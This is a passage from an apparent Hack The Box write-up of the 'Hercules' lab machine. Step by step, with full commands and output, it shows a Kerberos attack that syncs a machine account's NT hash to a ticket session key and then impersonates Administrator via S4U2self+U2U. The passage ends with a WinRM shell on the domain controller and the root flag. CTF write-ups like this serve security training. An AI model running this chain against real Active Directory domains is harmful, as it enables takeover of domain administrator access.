3. **Problem**: When we request a ticket for Administrator, it gets encrypted with a **new session key**
4. **Solution**: We need to extract that session key to use the ticket

Get the session key:

```bash
$ impacket-describeTicket iis_webserver$.ccache | grep 'Ticket Session Key'
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] Ticket Session Key            : c2ab045f8fcbe04ff4dcdcb10a9c4ca7
```
#### Change password with the session key

```bash
$ unset KRB5CCNAME
$ impacket-changepasswd -newhashes :c2ab045f8fcbe04ff4dcdcb10a9c4ca7 'hercules.htb'/'iis_webserver$':'Password123!'@'dc.hercules.htb' -k          /home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of hercules.htb\iis_webserver$
[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
[-] CCache file is not found. Skipping...
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

Note: You have to do this fast otherwise the password of `iis_webserver$` might get reset and you will have to repeat step 4 from above again.

1. We **Set the NT hash** of `iis_webserver$` to `c2ab045f8fcbe04ff4dcdcb10a9c4ca7`
2. This would make the password **match the session key** from the TGT
3. This is a technique to **synchronize** the password with the Kerberos session

```bash
$ python3 --version
Python 3.13.7
```

```bash
Impacket v0.12.0 
```

```bash
$ KRB5CCNAME=iis_webserver\$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'iis_webserver$'
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

`Secretsdump` or PTH won't work.

```bash
$ KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
/home/at0m/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: hercules.htb\Administrator
[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
[*] '-dc-ip' not specified, using hercules.htb

PS C:\Users\Administrator\Documents> cd  C:\Users\Admin\Desktop
PS C:\Users\Admin\Desktop> ls


    Directory: C:\Users\Admin\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/20/2025  11:54 PM             34 root.txt


PS C:\Users\Admin\Desktop> cat root.txt
53642c72d41e65e695d706ff56ab4e2a
```

---